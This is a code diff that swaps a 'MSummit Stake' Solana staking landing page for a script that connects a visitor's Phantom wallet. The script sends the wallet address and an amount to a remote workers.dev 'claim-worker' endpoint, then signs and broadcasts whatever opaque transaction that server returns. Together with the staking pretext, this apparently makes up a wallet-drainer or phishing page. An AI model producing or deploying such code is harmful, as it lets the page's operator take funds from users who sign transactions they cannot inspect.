@@ -1,50 +1,51 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MSummit Stake</title>
-    <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #0d1117;
-            color: white;
-            font-family: Arial, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            flex-direction: column;
-            gap: 20px;
-        }
-        h1 {
-            background: linear-gradient(68deg, #eb00ff 3.6%, #00f0ff 100%);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            font-size: 36px;
-        }
-        p { color: #aaa; font-size: 15px; }
-        .btn {
-            background: linear-gradient(68deg, #eb00ff 3.6%, #00f0ff 100%);
-            border: none;
-            color: white;
-            padding: 16px 55px;
-            border-radius: 25px;
-            font-size: 18px;
-            cursor: pointer;
-            font-weight: bold;
-            text-decoration: none;
-            display: inline-block;
-            margin-top: 10px;
-        }
-        .btn:hover { opacity: 0.85; }
-    </style>
-</head>
-<body>
-    <h1>🏔️ MSummit Stake</h1>
-    <p>Secure Solana Staking Platform</p>
-    <a class="btn" href="https://cloudflare-workers-autoconfig-msummit.msummit2026.workers.dev/">
-        🚀 Open Staking Platform
-    </a>
-</body>
-</html>
+<input id="amount" placeholder="Enter amount" />
+
+<button onclick="sendSplitTransaction()">
+  Send 70%
+</button>
+
+<script>
+async function sendSplitTransaction() {
+  const provider = window.solana;
+
+  if (!provider || !provider.isPhantom) {
+    alert("Phantom not found");
+    return;
+  }
+
+  await provider.connect();
+
+  const amount = parseFloat(document.getElementById("amount").value);
+
+  if (!amount || amount <= 0) {
+    alert("Invalid amount");
+    return;
+  }
+
+  const sender = provider.publicKey.toString();
+
+  const res = await fetch("https://frosty-meadow-f942-claim-worker.msummit2026.workers.dev/", {
+    method: "POST",
+    body: JSON.stringify({
+      sender,
+      mint: "A3vBwL3Pd6nkBqVo87D6TLWYG4ekWuDeqCoLFeyvRMcb",
+      amount: amount
+    }),
+  });
+
+  const { tx } = await res.json();
+
+  const transaction = solanaWeb3.Transaction.from(
+    Uint8Array.from(atob(tx), c => c.charCodeAt(0))
+  );
+
+  const signed = await provider.signTransaction(transaction);
+
+  const signature = await provider.request({
+    method: "sendRawTransaction",
+    params: [signed.serialize().toString("base64")],
+  });
+
+  console.log("TX Sent:", signature);
+}
+</script>
